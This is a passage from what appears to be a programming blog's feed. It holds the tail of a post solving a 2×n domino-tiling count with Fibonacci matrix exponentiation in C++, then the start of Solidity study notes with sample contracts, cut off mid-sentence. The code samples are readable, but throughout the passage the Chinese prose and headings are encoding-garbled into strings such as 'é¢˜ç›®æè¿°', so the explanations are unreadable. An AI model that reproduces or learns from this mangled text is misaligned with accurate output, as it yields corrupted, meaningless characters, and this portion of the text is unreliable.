å¼ºç‰ˆ"></a>éª¨ç‰Œ - åŠ å¼ºç‰ˆ</h3><h5 id="é¢˜ç›®æè¿°-49"><a href="#é¢˜ç›®æè¿°-49" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>æœ‰2<em>n çš„åœ°æ¿ï¼Œç”¨1</em>2å’Œ 2*1 çš„éª¨ç‰Œè¿›è¡Œé“ºåœ°æ¿ã€‚é—®å…±æœ‰å¤šå°‘ç§æƒ…å†µã€‚</p><p>ç»“æœå¯¹ 999983 å–ä½™ï¼Œ<strong>1&lt;=n&lt;=1e12ã€‚</strong></p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-47"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-47" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-49"><a href="#è¾“å…¥æè¿°-49" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ä¸€ä¸ªæ•´æ•°<span class="built_in">n</span></span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-49"><a href="#è¾“å‡ºæè¿°-49" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ‰å¤šå°‘ç§æƒ…å†µ</span><br></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯æ–æ³¢é‚£å¥‘æ•°åˆ—çš„çŸ©é˜µå¿«é€Ÿå¹‚</p><script type="math/tex; mode=display">[f(n-1), f(n-2)]*\begin{bmatrix}1 & 1\\1&0 \end{bmatrix} = [f(n), f(n-1)]\\æ‰€ä»¥\begin{bmatrix}f(1) & f(2)\\0&0 \end{bmatrix} * (\begin{bmatrix}1 & 0\\1&1 \end{bmatrix})^n = \begin{bmatrix}f(n+2) & f(n+1)\\0&0 \end{bmatrix}</script><p>æ— ä¼˜åŒ–çš„é€’å½’æ˜¯2^nï¼Œè®°å¿†åŒ–å¤„ç†æ˜¯nï¼Œä½†ç”±äºæ•°æ®é‡æ˜¯1e12ï¼Œé€’å½’è¿‡æ·±ä¼šçˆ†æ ˆ</p><p>æ”¹æˆé€’æ¨æ˜¯O(n)ï¼Œä¹Ÿå¤„ç†ä¸äº†ï¼Œå˜æˆçŸ©é˜µä¹˜æ³•æ˜¯O(8n)</p><p>å†åŠ ä¸Šå¿«é€Ÿå¹‚å°±æ˜¯O(8logn)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> ll mod = <span class="number">999983</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">matrix</span>&#123;</span></span><br><span class="line">ll m[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="function">matrix <span class="title">multi</span><span class="params">(struct matrix a, struct matrix b)</span></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">matrix</span> <span class="title">tmp</span>;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++)&#123;</span><br><span class="line">tmp.m[i][j] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">2</span>; k++)&#123;</span><br><span class="line">tmp.m[i][j] = (tmp.m[i][j] + a.m[i][k] * b.m[k][j]) % mod;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fastpower</span><span class="params">(ll n)</span></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">matrix</span> <span class="title">base</span>, <span class="title">ans</span>;</span></span><br><span class="line">    base.m[<span class="number">0</span>][<span class="number">0</span>] = base.m[<span class="number">0</span>][<span class="number">1</span>] = base.m[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    base.m[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    ans.m[<span class="number">0</span>][<span class="number">0</span>] = ans.m[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>;  </span><br><span class="line">    ans.m[<span class="number">0</span>][<span class="number">1</span>] = ans.m[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (n)&#123;</span><br><span class="line">        <span class="keyword">if</span>(n &amp; <span class="number">1</span>)&#123;</span><br><span class="line">            ans = <span class="built_in">multi</span>(ans, base);</span><br><span class="line">        &#125;</span><br><span class="line">        base = <span class="built_in">multi</span>(base, base);</span><br><span class="line">        n &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans.m[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">ll n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">1</span>) cout &lt;&lt; <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">2</span>) cout &lt;&lt; <span class="number">2</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">fastpower</span>(n) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;æˆ‘æ˜¯ä»€ä¹ˆfwğŸ˜¢&lt;/p&gt;</summary>
    
    
    
    
    <category term="algorithm" scheme="http://sh1k4ku.github.io/tags/algorithm/"/>
    
  </entry>
  
  <entry>
    <title>æ™ºèƒ½åˆçº¦</title>
    <link href="http://sh1k4ku.github.io/2023/05/08/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    <id>http://sh1k4ku.github.io/2023/05/08/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/</id>
    <published>2023-05-08T01:55:04.000Z</published>
    <updated>2023-05-22T14:22:35.379Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰åšå®¡è®¡çš„æ—¶å€™éƒ½æ˜¯ç¢°åˆ°ä»€ä¹ˆå­¦ä»€ä¹ˆï¼Œè¿™æ ·çš„ä»£ä»·å°±æ˜¯åŸºç¡€å¾ˆå·®ï¼Œ è¦ä¸€ç›´æœé‡å¤çš„ä¸œè¥¿ï¼Œæ‰€ä»¥å†³å®šå¥½å¥½è¯»ä¸€é<a href="https://learnblockchain.cn/docs/solidity/">Solidity ä¸­æ–‡æ–‡æ¡£ â€” Solidityä¸­æ–‡æ–‡æ¡£ â€” ç™»é“¾ç¤¾åŒº (learnblockchain.cn)</a>ï¼Œç„¶åå†æåˆ«çš„ï¼Œé¢„æœŸè¿™ä¸ªæœˆä»¥å†…</p><span id="more"></span><p>[toc]</p><h1 id="Solidityæºæ–‡ä»¶ç»“æ„"><a href="#Solidityæºæ–‡ä»¶ç»“æ„" class="headerlink" title="Solidityæºæ–‡ä»¶ç»“æ„"></a>Solidityæºæ–‡ä»¶ç»“æ„</h1><p>æºæ–‡ä»¶ä¸­å¯ä»¥åŒ…å«ä»»æ„æ•°é‡çš„ åˆçº¦å®šä¹‰ , æºæ–‡ä»¶å¼•å…¥ , pragma ã€ using for æŒ‡ä»¤å’Œ struct , enum , function , error ä»¥åŠå¸¸é‡å®šä¹‰ã€‚</p><h2 id="SPDXç‰ˆæœ¬è®¸å¯æ ‡è¯†"><a href="#SPDXç‰ˆæœ¬è®¸å¯æ ‡è¯†" class="headerlink" title="SPDXç‰ˆæœ¬è®¸å¯æ ‡è¯†"></a>SPDXç‰ˆæœ¬è®¸å¯æ ‡è¯†</h2><p>å…¨ç§°ä¸ºâ€œThe Softwaere Package Data Exchangeâ€ï¼Œç”¨æ¥è¯´æ˜å…¶ç‰ˆæƒè®¸å¯è¯</p><p><code>// SPDX-License-Identifier: MIT</code></p><h2 id="ç‰ˆæœ¬æ ‡è¯†"><a href="#ç‰ˆæœ¬æ ‡è¯†" class="headerlink" title="ç‰ˆæœ¬æ ‡è¯†"></a>ç‰ˆæœ¬æ ‡è¯†</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pragma</span></span><br></pre></td></tr></table></figure><p>Pragma æ˜¯ pragmatic information çš„ç®€ç§°ï¼Œå¯ç”¨ç¼–è¯‘æ£€æŸ¥åŠŸèƒ½ï¼Œæ£€æŸ¥ç‰ˆæœ¬æ˜¯å¦åŒ¹é…ï¼Œä¾‹å¦‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pragma</span> solidity ^<span class="number">0</span>.<span class="number">5</span>.<span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>è¡¨ç¤ºå¯è¢«å¤§äºç­‰äº0.5.2ä¸”å°äº0.6.0çš„ç‰ˆæœ¬ç¼–è¯‘ã€‚</p><h2 id="å¯¼å…¥å…¶ä»–æºæ–‡ä»¶"><a href="#å¯¼å…¥å…¶ä»–æºæ–‡ä»¶" class="headerlink" title="å¯¼å…¥å…¶ä»–æºæ–‡ä»¶"></a>å¯¼å…¥å…¶ä»–æºæ–‡ä»¶</h2><p>solidityæ”¯æŒå¯¼å…¥è¯­å¥æ¥æ¨¡å—åŒ–ä»£ç </p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;filename&quot;</span></span><br></pre></td></tr></table></figure><p><code>filename</code>è¢«ç§°ä¸ºå¯¼å…¥è·¯å¾„</p><p>ä½†ä¸å»ºè®®ä½¿ç”¨è¿™ç§å½¢å¼ï¼Œå®ƒä¼šæŠŠå¯¼å…¥è·¯å¾„ä¸­çš„å…¨å±€ç¬¦å·éƒ½å¯¼å…¥åˆ°å½“å‰å…¨å±€ä½œç”¨åŸŸï¼Œä¼šæ— æ³•é¢„æµ‹çš„æ±¡æŸ“å½“å‰å‘½åç©ºé—´ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å½¢å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import * as symbolName from â€œfilenameâ€;</span><br><span class="line">//ä¸¤ç§æ–¹å¼ç­‰ä»·</span><br><span class="line">import &quot;filename&quot; as symbolName;</span><br></pre></td></tr></table></figure><p>å¦‚æœå­˜åœ¨å‘½åå†²çªï¼Œå¯ä»¥åœ¨å¯¼å…¥æ—¶é‡å‘½åç¬¦å·ã€‚ä¸‹é¢ä»£ç å°±åˆ›å»ºäº†æ–°çš„å…¨å±€ç¬¦å·<code>alias</code>å’Œ<code>symbol2</code>ï¼Œå¼•ç”¨çš„<code>symbol1</code>å’Œ<code>symbol2</code>æ¥è‡ªâ€filenameâ€œã€‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;symbol1 <span class="keyword">as</span> <span class="keyword">alias</span>, symbol2&#125; <span class="keyword">from</span> &quot;filename&quot;;</span><br></pre></td></tr></table></figure><h2 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h2><p>å¯ä»¥ä½¿ç”¨å•è¡Œæ³¨é‡Šï¼ˆ <code>//</code> ï¼‰å’Œå¤šè¡Œæ³¨é‡Šï¼ˆ <code>/*...*/</code> ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//è¿™æ˜¯ä¸€ä¸ªå•è¡Œæ³¨é‡Š</span><br><span class="line">/*</span><br><span class="line">è¿™æ˜¯ä¸€ä¸ª</span><br><span class="line">å¤šè¡Œæ³¨é‡Šã€‚</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œè¿˜æœ‰ä¸€ç§æ³¨é‡Šå«åš NatSpec æ³¨é‡Šï¼Œç”¨ä¸‰æ–œçº¿ï¼ˆ <code>///</code> ï¼‰æˆ–åŒæ˜Ÿå·å—ï¼ˆ <code>/** ... */</code> ï¼‰æ¥å†™ï¼Œ å®ƒä»¬åº”è¯¥ç›´æ¥ç”¨åœ¨å‡½æ•°å£°æ˜æˆ–è¯­å¥çš„ä¸Šæ–¹ã€‚</p><h1 id="åˆçº¦ç»“æ„"><a href="#åˆçº¦ç»“æ„" class="headerlink" title="åˆçº¦ç»“æ„"></a>åˆçº¦ç»“æ„</h1><p>åœ¨ Solidity ä¸­ï¼Œåˆçº¦ç±»ä¼¼äºé¢å‘å¯¹è±¡ç¼–ç¨‹è¯­è¨€ä¸­çš„ç±»ã€‚ æ¯ä¸ªåˆçº¦ä¸­å¯ä»¥åŒ…å« çŠ¶æ€å˜é‡ï¼Œ å‡½æ•°ï¼Œ å‡½æ•°ä¿®é¥°å™¨ï¼Œ äº‹ä»¶ï¼Œ é”™è¯¯ï¼Œ ç»“æ„ç±»å‹ å’Œ æšä¸¾ç±»å‹ çš„å£°æ˜ï¼Œä¸”åˆçº¦å¯ä»¥ä»å…¶ä»–åˆçº¦ç»§æ‰¿ã€‚</p><p>è¿˜æœ‰ä¸€äº›ç‰¹æ®Šç§ç±»çš„åˆåŒï¼Œå«åš åº“åˆçº¦ å’Œ æ¥å£åˆçº¦ã€‚</p><h2 id="çŠ¶æ€å˜é‡"><a href="#çŠ¶æ€å˜é‡" class="headerlink" title="çŠ¶æ€å˜é‡"></a>çŠ¶æ€å˜é‡</h2><p>çŠ¶æ€å˜é‡æ˜¯æŒ‡å…¶å€¼è¢«æ°¸ä¹…åœ°å­˜å‚¨åœ¨åˆçº¦å­˜å‚¨ä¸­çš„å˜é‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.4.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint storedData; // çŠ¶æ€å˜é‡</span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å‡½æ•°ï¼ˆfunctionï¼‰"><a href="#å‡½æ•°ï¼ˆfunctionï¼‰" class="headerlink" title="å‡½æ•°ï¼ˆfunctionï¼‰"></a>å‡½æ•°ï¼ˆfunctionï¼‰</h2><p>å‡½æ•°æ˜¯ä»£ç çš„å¯æ‰§è¡Œå•ä½ã€‚ é€šå¸¸åœ¨åˆçº¦å†…å®šä¹‰å‡½æ•°ï¼Œä½†å®ƒä»¬ä¹Ÿå¯ä»¥è¢«å®šä¹‰åœ¨åˆçº¦ä¹‹å¤–ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.7.1 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract SimpleAuction &#123;</span><br><span class="line">    function bid() public payable &#123; // å‡½æ•°</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// å®šä¹‰åœ¨åˆçº¦ä¹‹å¤–çš„è¾…åŠ©å‡½æ•°</span><br><span class="line">function helper(uint x) pure returns (uint) &#123;</span><br><span class="line">    return x * 2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å‡½æ•°ä¿®é¥°å™¨ï¼ˆmodifierï¼‰"><a href="#å‡½æ•°ä¿®é¥°å™¨ï¼ˆmodifierï¼‰" class="headerlink" title="å‡½æ•°ä¿®é¥°å™¨ï¼ˆmodifierï¼‰"></a>å‡½æ•°ä¿®é¥°å™¨ï¼ˆmodifierï¼‰</h2><p>å‡½æ•°ä¿®é¥°å™¨å¯ä»¥è¢«ç”¨æ¥ä»¥å£°æ˜çš„æ–¹å¼ä¿®æ”¹å‡½æ•°çš„è¯­ä¹‰</p><p>å…·æœ‰åŒä¸€ä¸ªmodifierçš„åå­—ä½†å‚æ•°ä¸åŒæ˜¯ä¸å¯èƒ½çš„ï¼›ä½†æ˜¯modifierå¯ä»¥è¢«é‡è½½/è¦†å†™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.4.22 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract Purchase &#123;</span><br><span class="line">    address public seller;</span><br><span class="line"></span><br><span class="line">    modifier onlySeller() &#123; // ä¿®é¥°å™¨</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == seller,</span><br><span class="line">            &quot;Only seller can call this.&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function abort() public view onlySeller &#123; // ä¿®é¥°å™¨çš„ä½¿ç”¨</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="äº‹ä»¶ï¼ˆeventï¼‰"><a href="#äº‹ä»¶ï¼ˆeventï¼‰" class="headerlink" title="äº‹ä»¶ï¼ˆeventï¼‰"></a>äº‹ä»¶ï¼ˆeventï¼‰</h2><p>äº‹ä»¶æ˜¯èƒ½æ–¹ä¾¿åœ°è°ƒç”¨ä»¥å¤ªåŠè™šæ‹Ÿæœºæ—¥å¿—åŠŸèƒ½çš„æ¥å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.4.21 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract SimpleAuction &#123;</span><br><span class="line">    event HighestBidIncreased(address bidder, uint amount); // äº‹ä»¶</span><br><span class="line"></span><br><span class="line">    function bid() public payable &#123;</span><br><span class="line">        // ...</span><br><span class="line">        emit HighestBidIncreased(msg.sender, msg.value); // è§¦å‘äº‹ä»¶</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é”™è¯¯ï¼ˆerror-ï¼‰"><a href="#é”™è¯¯ï¼ˆerror-ï¼‰" class="headerlink" title="é”™è¯¯ï¼ˆerror ï¼‰"></a>é”™è¯¯ï¼ˆerror ï¼‰</h2><p>errorä¸ºå¤±è´¥æƒ…å†µå®šä¹‰æè¿°æ€§çš„åç§°å’Œæ•°æ®ï¼Œå¯ä»¥åœ¨å›æ»šï¼ˆrevertç­‰ï¼‰ä¸­ä½¿ç”¨ã€‚ä¸å­—ç¬¦ä¸²ç›¸æ¯”ï¼Œerrorè¦ä¾¿å®œçš„å¤šï¼ˆæ¶ˆè€—çš„gaså°‘ï¼‰ï¼Œå¹¶å…è®¸å¯¹é¢å¤–çš„æ•°æ®è¿›è¡Œç¼–ç ã€‚å¯ä»¥ä½¿ç”¨ NatSpec æ ¼å¼æ¥å‘ç”¨æˆ·æè¿°é”™è¯¯ã€‚</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: GPL-3.0</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="doctag">///</span> æ²¡æœ‰è¶³å¤Ÿçš„èµ„é‡‘ç”¨äºè½¬è´¦ã€‚è¦æ±‚ `requested`ã€‚</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> ä½†åªæœ‰ `available` å¯ç”¨ã€‚</span></span><br><span class="line"><span class="function">error <span class="title">NotEnoughFunds</span>(<span class="params"><span class="built_in">uint</span> requested, <span class="built_in">uint</span> available</span>)</span>;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; <span class="built_in">uint</span>) balances;</span><br><span class="line">    <span class="function">function <span class="title">transfer</span>(<span class="params">address to, <span class="built_in">uint</span> amount</span>) <span class="keyword">public</span></span> &#123;</span><br><span class="line">        <span class="built_in">uint</span> balance = balances[msg.sender];</span><br><span class="line">        <span class="keyword">if</span> (balance &lt; amount)</span><br><span class="line">            <span class="function">revert <span class="title">NotEnoughFunds</span>(<span class="params">amount, balance</span>)</span>; <span class="comment">//å›æ»š error</span></span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">        balances[to] += amount;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç»“æ„ç±»å‹ï¼ˆstructï¼‰"><a href="#ç»“æ„ç±»å‹ï¼ˆstructï¼‰" class="headerlink" title="ç»“æ„ç±»å‹ï¼ˆstructï¼‰"></a>ç»“æ„ç±»å‹ï¼ˆstructï¼‰</h2><p>ç»“æ„ç±»å‹æ˜¯å¯ä»¥å°†å‡ ä¸ªå˜é‡åˆ†ç»„çš„è‡ªå®šä¹‰ç±»å‹ï¼Œå’Œcè¯­è¨€ä¸€æ ·çš„</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: GPL-3.0</span></span><br><span class="line"><span class="keyword">pragma</span> solidity &gt;=<span class="number">0.4</span><span class="number">.0</span> &lt;<span class="number">0.9</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Ballot &#123;</span><br><span class="line">    <span class="keyword">struct</span> Voter &#123; <span class="comment">// ç»“æ„</span></span><br><span class="line">        <span class="built_in">uint</span> weight;</span><br><span class="line">        <span class="built_in">bool</span> voted;</span><br><span class="line">        address <span class="built_in">delegate</span>;</span><br><span class="line">        <span class="built_in">uint</span> vote;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æšä¸¾ç±»å‹ï¼ˆenumï¼‰"><a href="#æšä¸¾ç±»å‹ï¼ˆenumï¼‰" class="headerlink" title="æšä¸¾ç±»å‹ï¼ˆenumï¼‰"></a>æšä¸¾ç±»å‹ï¼ˆenumï¼‰</h2><p>enumå¯ç”¨æ¥åˆ›å»ºç”±ä¸€å®šæ•°é‡çš„â€™å¸¸é‡å€¼â€™æ„æˆçš„è‡ªå®šä¹‰ç±»å‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> SPDX-License-Identifier: GPL-<span class="number">3.0</span></span><br><span class="line">pragma solidity &gt;=<span class="number">0.4</span>.<span class="number">0</span> &lt;<span class="number">0.9</span>.<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">contract Purchase &#123;</span><br><span class="line">    enum State &#123; Created, Locked, Inactive &#125; <span class="regexp">//</span> æšä¸¾</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h1><h2 id="å€¼ç±»å‹"><a href="#å€¼ç±»å‹" class="headerlink" title="å€¼ç±»å‹"></a>å€¼ç±»å‹</h2><p>ä»¥ä¸‹ç±»å‹ä¹Ÿç§°ä¸ºå€¼ç±»å‹ï¼Œå› ä¸ºè¿™äº›ç±»å‹çš„å˜é‡å°†å§‹ç»ˆæŒ‰å€¼æ¥ä¼ é€’ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“è¿™äº›å˜é‡è¢«ç”¨ä½œå‡½æ•°å‚æ•°æˆ–è€…ç”¨åœ¨èµ‹å€¼è¯­å¥ä¸­æ—¶ï¼Œæ€»ä¼šè¿›è¡Œå€¼æ‹·è´ã€‚</p><h3 id="å¸ƒå°”ç±»å‹"><a href="#å¸ƒå°”ç±»å‹" class="headerlink" title="å¸ƒå°”ç±»å‹"></a>å¸ƒå°”ç±»å‹</h3><p><code>bool</code> ï¼šå¯èƒ½çš„å–å€¼ä¸ºå­—é¢å¸¸æ•°å€¼ <code>true</code> å’Œ <code>false</code></p><p>è¿ç®—ç¬¦ï¼š</p><ul><li><code>!</code> ï¼ˆé€»è¾‘éï¼‰</li><li><code>&amp;&amp;</code> ï¼ˆé€»è¾‘ä¸ï¼Œ â€œandâ€ ï¼‰</li><li><code>||</code> ï¼ˆé€»è¾‘æˆ–ï¼Œ â€œorâ€ ï¼‰</li><li><code>==</code> ï¼ˆç­‰äºï¼‰</li><li><code>!=</code> ï¼ˆä¸ç­‰äºï¼‰</li></ul><p>å…¶ä¸­ä¸å’Œæˆ–éƒ½éµå¾ªçŸ­è·¯åŸåˆ™</p><h3 id="æ•´å‹"><a href="#æ•´å‹" class="headerlink" title="æ•´å‹"></a>æ•´å‹</h3><p><code>int</code> / <code>uint</code> ï¼šåˆ†åˆ«è¡¨ç¤ºæœ‰ç¬¦å·å’Œæ— ç¬¦å·çš„ä¸åŒä½æ•°çš„æ•´å‹å˜é‡ã€‚ æ”¯æŒå…³é”®å­— <code>uint8</code> 